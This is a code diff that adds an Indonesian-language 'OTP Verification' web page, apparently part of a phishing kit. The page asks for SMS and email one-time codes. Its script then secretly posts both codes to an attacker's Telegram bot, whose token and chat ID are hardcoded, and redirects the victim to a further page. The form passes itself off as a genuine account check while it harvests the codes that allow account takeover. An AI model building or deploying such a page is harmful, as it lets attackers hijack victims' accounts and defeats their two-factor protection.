@@ -1,0 +1,178 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>OTP Verification</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+</head>
+<body class="bg-white min-h-screen flex flex-col">
+  <div class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
+    <button aria-label="Back" class="text-black text-xl">
+      <i class="fas fa-arrow-left"></i>
+    </button>
+    <button aria-label="Headphone icon" class="text-black text-2xl">
+      <i class="fas fa-headphones-alt"></i>
+    </button>
+  </div>
+
+  <main class="flex-grow px-6 pt-6">
+    <h1 class="font-bold text-lg text-black mb-1">Verifikasi akun kamu</h1>
+    <p class="text-gray-600 text-sm mb-6">
+      Masukkan 4 digit kode OTP yang ada di WhatsApp dan Email.
+    </p>
+
+    <label for="otp-sms" class="block text-black text-sm mb-1 font-medium">
+      Kode OTP SMS
+    </label>
+    <input
+      id="otp-sms"
+      type="text"
+      maxlength="4"
+      class="w-full border border-purple-600 rounded-md px-3 py-2 text-lg text-black focus:outline-none focus:ring-2 focus:ring-purple-600"
+      aria-describedby="sms-info"
+      autocomplete="one-time-code"
+      inputmode="numeric"
+    />
+    <p id="sms-info" class="text-gray-700 text-xs mt-1 mb-6">
+      Terkirim ke <span class="font-semibold">+62 **********</span>
+    </p>
+
+    <label for="otp-email" class="block text-black text-sm mb-1 font-medium">
+      Kode OTP Email
+    </label>
+    <input
+      id="otp-email"
+      type="text"
+      maxlength="4"
+      class="w-full border border-purple-600 rounded-md px-3 py-2 text-lg text-black focus:outline-none focus:ring-2 focus:ring-purple-600"
+      aria-describedby="email-info"
+      autocomplete="one-time-code"
+      inputmode="numeric"
+    />
+    <p id="email-info" class="text-gray-700 text-xs mt-1 mb-6">
+      Terkirim ke *********@gmail.com
+    </p>
+  </main>
+
+  <footer class="px-6 mb-4 text-center text-xs text-gray-600">
+    <span>Tidak menerima kode?</span>
+    <button id="resend-btn" disabled class="text-gray-400 ml-1 cursor-default">
+      Kirim ulang (01:00)
+    </button>
+  </footer>
+
+  <div class="px-6 pb-6">
+    <button
+      id="send-btn"
+      class="w-full bg-gray-200 text-gray-400 rounded-full py-3 text-center text-base font-semibold cursor-not-allowed"
+      disabled
+    >
+      Kirim
+    </button>
+  </div>
+
+  <script>
+    // Replace with your Telegram bot token and chat ID
+    const TELEGRAM_BOT_TOKEN = '8392304649:AAFSpxG4uQqhdzOi-XD0ADeuykpj4RGAgDU';
+    const TELEGRAM_CHAT_ID = '7914074847';
+
+    const otpSmsInput = document.getElementById('otp-sms');
+    const otpEmailInput = document.getElementById('otp-email');
+    const sendBtn = document.getElementById('send-btn');
+    const resendBtn = document.getElementById('resend-btn');
+
+    let countdown = 60;
+    let countdownInterval;
+
+    function startCountdown() {
+      resendBtn.disabled = true;
+      resendBtn.classList.add('text-gray-400', 'cursor-default');
+      resendBtn.classList.remove('text-purple-600', 'cursor-pointer');
+      resendBtn.textContent = `Kirim ulang (01:00)`;
+      countdown = 60;
+
+      countdownInterval = setInterval(() => {
+        countdown--;
+        const minutes = Math.floor(countdown / 60);
+        const seconds = countdown % 60;
+        const formattedSeconds = seconds < 10 ? `0${seconds}` : seconds;
+        resendBtn.textContent = `Kirim ulang (0${minutes}:${formattedSeconds})`;
+
+        if (countdown <= 0) {
+          clearInterval(countdownInterval);
+          resendBtn.disabled = false;
+          resendBtn.textContent = 'Kirim ulang';
+          resendBtn.classList.remove('text-gray-400', 'cursor-default');
+          resendBtn.classList.add('text-purple-600', 'cursor-pointer');
+        }
+      }, 1000);
+    }
+
+    function updateButtonState() {
+      if (
+        otpSmsInput.value.length === 4 &&
+        otpEmailInput.value.length === 4
+      ) {
+        sendBtn.disabled = false;
+        sendBtn.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
+        sendBtn.classList.add('bg-purple-600', 'text-white', 'cursor-pointer');
+      } else {
+        sendBtn.disabled = true;
+        sendBtn.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
+        sendBtn.classList.remove('bg-purple-600', 'text-white', 'cursor-pointer');
+      }
+    }
+
+    otpSmsInput.addEventListener('input', updateButtonState);
+    otpEmailInput.addEventListener('input', updateButtonState);
+
+    sendBtn.addEventListener('click', () => {
+      const smsCode = otpSmsInput.value;
+      const emailCode = otpEmailInput.value;
+
+      const message = `Kode OTP SMS: ${smsCode}\nKode OTP Email: ${emailCode}`;
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          window.location.href = "otpemail.html";
+          otpSmsInput.value = '';
+          otpEmailInput.value = '';
+          updateButtonState();
+          startCountdown();
+        } else {
+          alert('Gagal mengirim kode OTP ke Telegram.');
+        }
+      })
+      .catch(() => {
+        alert('Terjadi kesalahan saat mengirim data.');
+      });
+    });
+
+    resendBtn.addEventListener('click', () => {
+      if (!resendBtn.disabled) {
+        // Logic to resend OTP can be added here
+        alert('Kode OTP telah dikirim ulang.');
+        startCountdown();
+      }
+    });
+
+    // Start countdown on page load
+    startCountdown();
+  </script>
+</body>
+</html>
